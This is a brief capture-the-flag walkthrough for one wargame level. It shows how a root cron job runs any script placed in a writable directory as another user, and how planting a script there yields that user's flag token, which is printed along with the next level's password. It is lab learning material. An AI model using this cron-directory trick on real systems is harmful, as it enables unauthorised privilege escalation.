## When we are log as level05 we receive a new mail in mail folder called level05

ls /var/mail
-> level05

cat /var/mail/level05
-> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

## This cron runs a script every 2 minutes

cat /usr/sbin/openarenaserver
```
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
			(ulimit -t 5; bash -x "$i")
			rm -f "$i"
	done
```

## the previous script executes any script inside /opt/openarenaserver/ as the user flag05, we will create a script where we execute getflag

echo "/bin/getflag > /tmp/get_my_flag" > /opt/openarenaserver/get_my_flag

cat /opt/openarenaserver/get_my_flag
-> /bin/getflag > /tmp/get_my_flag

## wait 2 minutes max and we have the password
cat /tmp/get_my_flag
-> Check flag.Here is your token : viuaaale9huek52boumoomioc

## Log in to user level06
su level06 (password: viuaaale9huek52boumoomioc)